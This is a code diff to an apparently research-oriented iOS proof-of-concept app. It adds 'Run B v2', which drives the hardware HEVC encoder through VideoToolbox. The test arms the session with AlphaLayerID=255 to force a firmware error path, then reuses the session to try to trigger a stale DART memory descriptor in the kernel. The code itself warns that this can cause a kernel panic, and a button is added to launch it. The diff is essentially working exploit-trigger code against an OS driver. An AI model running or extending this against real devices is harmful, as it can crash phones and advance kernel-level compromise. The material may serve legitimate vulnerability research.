@@ -2690,6 +2690,204 @@ static void runPhase2_Teardown(void) {
 }
 
 // ============================================================
+// Run B v2: Frame-by-frame DART re-use test
+// Arms with Alpha=255, then encodes clean frames one at a time
+// on the SAME session to trigger synchronous DART cleanup path
+// via AVE_EncodeSubmit_TriggerCleanup (+0xf8 gate stays open
+// after -17691 firmware error).
+// ============================================================
+
+static void runRunB_v2(void) {
+    if (g_phase2Running) {
+        INFO(@"Phase 2 test already running — wait for it.");
+        return;
+    }
+    g_phase2Running = YES;
+
+    pocLog(@"");
+    pocLog(@"╔══════════════════════════════════════════╗");
+    pocLog(@"║  RUN B v2: Frame-by-Frame DART Re-use    ║");
+    pocLog(@"║  Alpha=255 arm → clean encode × 10       ║");
+    pocLog(@"║  Tests synchronous cleanup path (+0xf8)  ║");
+    pocLog(@"║  *** CAN CAUSE KERNEL PANIC ***          ║");
+    pocLog(@"╚══════════════════════════════════════════╝");
+    pocLog(@"");
+
+    NSDateFormatter *fmt = [[NSDateFormatter alloc] init];
+    fmt.dateFormat = @"HH:mm:ss.SSS";
+
+    // Step 1: Canary encode to verify AVE2 is healthy
+    LOG(@"--- STEP 1: CANARY (AlphaLayerID=0) ---");
+    BOOL canary = phase2Encode(0, @"CANARY");
+    if (!canary) {
+        FAIL(@"CANARY FAILED — AVE2 wedged. Reboot phone.");
+        g_phase2Running = NO;
+        return;
+    }
+    PASS(@"CANARY OK — encoder healthy.");
+    idleWait(10, @"canary cooldown");
+
+    // Step 2: Create session and arm with Alpha=255
+    LOG(@"--- STEP 2: ARM with AlphaLayerID=255 ---");
+    NSDictionary *spec = @{
+        (NSString *)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES,
+        (NSString *)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder: @YES,
+    };
+
+    VTCompressionSessionRef session = NULL;
+    OSStatus status = VTCompressionSessionCreate(
+        kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
+        (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
+        narrowCallback, NULL, &session);
+
+    if (status != noErr) {
+        FAIL(@"Session creation failed: %d", (int)status);
+        g_phase2Running = NO;
+        return;
+    }
+
+    status = VTSessionSetProperty(session,
+        CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
+        (__bridge CFTypeRef)@(255));
+    INFO(@"SET AlphaLayerID=255: %s", status == noErr ? "OK" : "REJECTED");
+
+    status = VTCompressionSessionPrepareToEncodeFrames(session);
+    if (status != noErr) {
+        FAIL(@"PrepareToEncode failed: %d", (int)status);
+        VTCompressionSessionInvalidate(session);
+        CFRelease(session);
+        g_phase2Running = NO;
+        return;
+    }
+
+    CVPixelBufferRef pb = createTestPixelBuffer(320, 240);
+    if (!pb) {
+        FAIL(@"Pixel buffer failed");
+        VTCompressionSessionInvalidate(session);
+        CFRelease(session);
+        g_phase2Running = NO;
+        return;
+    }
+
+    g_narrowGotOutput = NO;
+    g_oracleContext = @"runB-v2-arm";
+
+    LOG(@"*** ENCODING WITH AlphaLayerID=255 (arming) ***");
+    LOG(@"ARM time: %@", [fmt stringFromDate:[NSDate date]]);
+    status = VTCompressionSessionEncodeFrame(session, pb,
+        CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
+    INFO(@"EncodeFrame: %d (%s)", (int)status,
+        status == noErr ? "submitted" : "error");
+
+    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
+    [NSThread sleepForTimeInterval:2.0];
+
+    BOOL armed = !g_narrowGotOutput;
+    INFO(@"Callback output: %@ (expect NO for -17691 path)",
+        g_narrowGotOutput ? @"YES" : @"NO");
+    CVPixelBufferRelease(pb);
+
+    if (!armed) {
+        INFO(@"WARNING: Got output (no -17691). Continuing anyway.");
+    } else {
+        PASS(@"Armed: -17691 error path taken. +0xf8 should still be 1.");
+    }
+    pocLog(@"");
+
+    // Step 3: Switch to Alpha=0 and encode clean frames one at a time
+    LOG(@"--- STEP 3: CLEAN ENCODE x10 (same session, Alpha=0) ---");
+    INFO(@"Session NOT invalidated. +0xf8 gate should still be open.");
+    INFO(@"Each encode triggers AVE_EncodeSubmit_TriggerCleanup.");
+    INFO(@"If stale DART descriptor fires -> panic during encode.");
+    pocLog(@"");
+
+    status = VTSessionSetProperty(session,
+        CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
+        (__bridge CFTypeRef)@(0));
+    INFO(@"SET AlphaLayerID=0: %s (switched to clean)",
+        status == noErr ? "OK" : "REJECTED");
+    pocLog(@"");
+
+    int completedFrames = 0;
+    for (int frame = 1; frame <= 10; frame++) {
+        LOG(@"=== FRAME %d/10 at %@ ===",
+            frame, [fmt stringFromDate:[NSDate date]]);
+
+        CVPixelBufferRef framePb = createTestPixelBuffer(320, 240);
+        if (!framePb) {
+            FAIL(@"Frame %d: pixel buffer failed", frame);
+            break;
+        }
+
+        g_narrowGotOutput = NO;
+        g_oracleContext = [NSString stringWithFormat:@"runB-v2-f%d", frame];
+
+        OSStatus encStatus = VTCompressionSessionEncodeFrame(
+            session, framePb,
+            CMTimeMake(frame, 30), kCMTimeInvalid, NULL, NULL, NULL);
+        INFO(@"Frame %d encode: %d (%s)", frame, (int)encStatus,
+            encStatus == noErr ? "submitted" : "error");
+
+        VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
+        [NSThread sleepForTimeInterval:2.0];
+
+        INFO(@"Frame %d output: %@ at %@", frame,
+            g_narrowGotOutput ? @"YES" : @"NO (error)",
+            [fmt stringFromDate:[NSDate date]]);
+        CVPixelBufferRelease(framePb);
+
+        if (encStatus != noErr) {
+            FAIL(@"Frame %d: encode error %d — session dead?",
+                frame, (int)encStatus);
+            break;
+        }
+        completedFrames = frame;
+
+        if (frame < 10) {
+            INFO(@"Waiting 10s before frame %d...", frame + 1);
+            for (int s = 10; s > 0; s--) {
+                if (s <= 3 || s % 5 == 0) {
+                    INFO(@"  ... %ds", s);
+                }
+                [NSThread sleepForTimeInterval:1.0];
+            }
+        }
+        pocLog(@"");
+    }
+
+    // Step 4: Results
+    pocLog(@"");
+    LOG(@"=== RUN B v2 RESULTS at %@ ===", [fmt stringFromDate:[NSDate date]]);
+
+    if (completedFrames < 10) {
+        FAIL(@"Session died at frame %d — possible DART fault on re-use!",
+            completedFrames + 1);
+        INFO(@"Deferred descriptor may have fired during encode submission.");
+    } else {
+        PASS(@"All 10 frames survived — no synchronous DART fault.");
+        INFO(@"Descriptor did NOT fire on encode re-use.");
+        INFO(@"Either: (a) cleanup on -17691 path, or");
+        INFO(@"        (b) stale descriptor needs different trigger.");
+    }
+    pocLog(@"");
+
+    // Cleanup
+    LOG(@"Invalidating session...");
+    VTCompressionSessionInvalidate(session);
+    CFRelease(session);
+
+    LOG(@"Post-invalidate wait 30s (catch teardown-triggered fault)...");
+    idleWait(30, @"post-Run-B-v2 teardown window");
+
+    PASS(@"=== RUN B v2 COMPLETE ===");
+    INFO(@"Record: armed=%@, frames=%d/10",
+        armed ? @"YES" : @"NO", completedFrames);
+    pocLog(@"");
+
+    g_phase2Running = NO;
+}
+
+// ============================================================
 // Tier 1b: OOB trigger — ONLY for properties verified by oracle
 // ============================================================
 
@@ -3183,7 +3381,22 @@ static void runTier2Probe(void) {
     [teardownBtn addTarget:self action:@selector(runTeardown) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:teardownBtn];
 
-    CGFloat logTop = row6 + btnH + gap;
+    // Run B v2 button — row 7: frame-by-frame DART re-use test
+    CGFloat row7 = row6 + btnH + gap;
+
+    UIButton *runBv2Btn = [UIButton buttonWithType:UIButtonTypeSystem];
+    runBv2Btn.frame = CGRectMake(pad, row7, w - pad * 2, btnH);
+    runBv2Btn.backgroundColor = [UIColor colorWithRed:0.6 green:0.0 blue:0.1 alpha:1];
+    runBv2Btn.layer.cornerRadius = 8;
+    runBv2Btn.layer.borderWidth = 2;
+    runBv2Btn.layer.borderColor = [UIColor colorWithRed:1.0 green:0.2 blue:0.2 alpha:1].CGColor;
+    runBv2Btn.titleLabel.font = [UIFont boldSystemFontOfSize:13];
+    [runBv2Btn setTitle:@"Run B v2: DART Re-use (10 frames)" forState:UIControlStateNormal];
+    [runBv2Btn setTitleColor:[UIColor colorWithRed:1.0 green:0.2 blue:0.2 alpha:1] forState:UIControlStateNormal];
+    [runBv2Btn addTarget:self action:@selector(runRunBv2) forControlEvents:UIControlEventTouchUpInside];
+    [self.view addSubview:runBv2Btn];
+
+    CGFloat logTop = row7 + btnH + gap;
     self.logView = [[UITextView alloc] initWithFrame:
         CGRectMake(0, logTop, w, self.view.bounds.size.height - logTop)];
     self.logView.autoresizingMask = UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight;
@@ -3289,6 +3502,12 @@ static void runTier2Probe(void) {
 - (void)runTeardown {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
         runPhase2_Teardown();
+    });
+}
+
+- (void)runRunBv2 {
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        runRunB_v2();
     });
 }
 
